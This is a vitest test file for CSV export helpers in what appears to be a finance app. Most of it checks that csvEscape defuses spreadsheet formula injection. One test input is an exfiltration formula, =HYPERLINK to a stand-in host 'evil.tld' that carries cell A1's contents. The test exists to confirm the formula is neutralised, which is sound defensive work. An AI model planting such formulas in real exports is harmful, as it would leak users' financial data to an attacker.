import type { Response } from 'express';
import { describe, expect, it, vi } from 'vitest';

import { csvEscape, formatAmount, round2, sendCsv, toCsv } from '../csv';

describe('round2', () => {
  it('rounds to two decimals', () => {
    expect(round2(1.005)).toBe(1.01);
    expect(round2(1234.567)).toBe(1234.57);
    expect(round2(2)).toBe(2);
  });
});

describe('formatAmount', () => {
  it('formats numbers as 2-decimal fixed point', () => {
    expect(formatAmount(1234.5)).toBe('1234.50');
    expect(formatAmount(0)).toBe('0.00');
  });
});

describe('csvEscape', () => {
  it('wraps fields containing commas, quotes, or newlines in quotes', () => {
    expect(csvEscape('plain')).toBe('plain');
    expect(csvEscape('a,b')).toBe('"a,b"');
    expect(csvEscape('say "hi"')).toBe('"say ""hi"""');
    expect(csvEscape('line1\nline2')).toBe('"line1\nline2"');
  });

  it('renders nullish values as empty fields', () => {
    expect(csvEscape(null)).toBe('');
    expect(csvEscape(undefined)).toBe('');
  });

  /**
   * Transaction descriptions come from the bank feed, so an attacker can plant a cell by sending
   * a €0.01 transfer with a crafted reference. Opening the export must not execute it.
   */
  describe('formula injection', () => {
    it('neutralises every leading formula character', () => {
      expect(csvEscape('=1+1')).toBe("'=1+1");
      expect(csvEscape('+1')).toBe("'+1");
      expect(csvEscape('@SUM(A1)')).toBe("'@SUM(A1)");
      expect(csvEscape('\tcmd')).toBe("'\tcmd");
      expect(csvEscape('\rcmd')).toBe('"\'\rcmd"');
    });

    it('guards the payload before RFC 4180 quoting, so both protections apply', () => {
      expect(csvEscape('=HYPERLINK("https://evil.tld?x="&A1,"Total")')).toBe(
        '"\'=HYPERLINK(""https://evil.tld?x=""&A1,""Total"")"',
      );
    });

    it('leaves negative amounts untouched so the numeric round-trip still holds', () => {
      expect(csvEscape(formatAmount(-12.3))).toBe('-12.30');
      expect(csvEscape(-5)).toBe('-5');
      expect(csvEscape('-0.01')).toBe('-0.01');
    });

    it('guards a value that only looks numeric', () => {
      expect(csvEscape('-1+1')).toBe("'-1+1");
      expect(csvEscape('-1,0')).toBe('"\'-1,0"');
    });

    it('leaves ordinary text alone', () => {
      expect(csvEscape('Groceries')).toBe('Groceries');
      expect(csvEscape('2026-01-01')).toBe('2026-01-01');
    });
  });
});

describe('toCsv formula injection', () => {
  it('guards header cells as well as row cells', () => {
    expect(toCsv(['=header'], [['=row']])).toBe("﻿'=header\n'=row\n");
  });
});

describe('toCsv', () => {
  it('prepends a UTF-8 BOM and terminates each row with a newline', () => {
    const csv = toCsv(['a', 'b'], [[1, 'x,y']]);
    expect(csv).toBe('\uFEFFa,b\n1,"x,y"\n');
  });
});

describe('sendCsv', () => {
  it('sets CSV headers and sends the payload', () => {
    const setHeader = vi.fn();
    const send = vi.fn();
    const res = { send, setHeader } as unknown as Response;

    sendCsv(res, 'report.csv', '\uFEFFa\n1\n');

    expect(setHeader).toHaveBeenCalledWith('Content-Type', 'text/csv; charset=utf-8');
    expect(setHeader).toHaveBeenCalledWith('Content-Disposition', 'attachment; filename="report.csv"');
    expect(send).toHaveBeenCalledWith('\uFEFFa\n1\n');
  });
});
